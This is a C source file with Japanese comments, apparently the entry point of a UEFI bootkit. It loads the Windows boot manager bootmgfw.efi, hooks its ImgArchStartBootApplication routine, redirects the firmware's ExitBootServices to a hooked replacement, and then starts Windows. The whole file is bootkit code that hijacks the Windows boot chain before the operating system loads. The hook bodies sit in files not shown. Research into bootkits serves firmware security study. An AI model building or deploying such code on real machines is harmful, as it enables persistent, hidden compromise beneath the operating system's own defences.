﻿#include "Print.h"
#include "Bootmgfw.h"
#include "Serial.h"
#include "ExitBootServices.h"

#include <efi.h>
#include <efilib.h>

extern EFI_EXIT_BOOT_SERVICES OriginalExitBootServices;

// UEFIエントリーポイント
EFI_STATUS efi_main(EFI_HANDLE ImageHandle, EFI_SYSTEM_TABLE* SystemTable)
{
    EFI_STATUS Status;

    EFI_DEVICE_PATH* BootmgrPath = NULL;
    EFI_HANDLE BootmgrHandle;

#if defined(_GNU_EFI)
    InitializeLib(ImageHandle, SystemTable);
#endif
    do
    {
        SerialPortInitialize(SERIAL_PORT_NUM, SERIAL_BAUDRATE);

        gST->ConOut->ClearScreen(gST->ConOut);

        Print(L"\r\n%H*** UEFI bootkit ***%N\r\n\r\n");

        // bootkit.efiの情報を表示
        Status = PrintLoadedImageInfo(&ImageHandle);
        if (EFI_ERROR(Status))
        {
            Print(L"[-] Failed to PrintImageInfo(Status: %d)\r\n", Status);
        }

        // bootmgfw.efiのパスを取得
        BootmgrPath = GetWindowsBootmgrDevicePath();
        if (BootmgrPath == NULL)
        {
            Print(L"[-] Failed to find the Windows EFI bootmgr\r\n");
            Status = EFI_NOT_FOUND;
            break;
        }
        Print(L"[+] Found the Windows EFI bootmgr\r\n");

        // bootmgfw.efiをロードする
        Status = gBS->LoadImage(TRUE, ImageHandle, BootmgrPath, NULL, 0, &BootmgrHandle);
        if (EFI_ERROR(Status))
        {
            Print(L"[-] Failed to load the Windows EFI bootmgr(Status=%d)\r\n", Status);
            FreePool(BootmgrPath);
            break;
        }
        Print(L"[+] Loaded the Windows EFI bootmgr(Handle: %lx)\r\n", BootmgrHandle);

        FreePool(BootmgrPath);

        // bootmgfw.efiの情報を表示
        PrintLoadedImageInfo(&BootmgrHandle);

        //bootmgfw.efi!ImgArchStartBootApplicationをフック
        Status = SetupImgArchStartBootApplication(BootmgrHandle);
        if (EFI_ERROR(Status))
        {
            Print(L"[-] Failed to hook to Windows EFI bootmgr(Status=%d)\r\n", Status);
        }
        Print(L"[+] Hooked the bootmgfw.efi!ImgArchStartBootApplication\r\n");

        OriginalExitBootServices = SetServicePointer((VOID*)&gBS->ExitBootServices, &HookedExitBootServices, TRUE);
        Print(L"[+] Original ExitBootServices is 0x%llx\n", OriginalExitBootServices);

        // bootmgfw.efiを実行する
        Status = gBS->StartImage(BootmgrHandle, NULL, NULL);
        if (EFI_ERROR(Status))
        {
            Print(L"[-] Failed to start the Windows EFI bootmgr: %r\r\n", Status);
            gBS->UnloadImage(BootmgrHandle);
            break;
        }
        Print(L"[+] Started the Windows EFI bootmgr\r\n");

        gBS->Exit(ImageHandle, 1, 0, NULL);
    } while (FALSE);

    return EFI_SUCCESS;
}
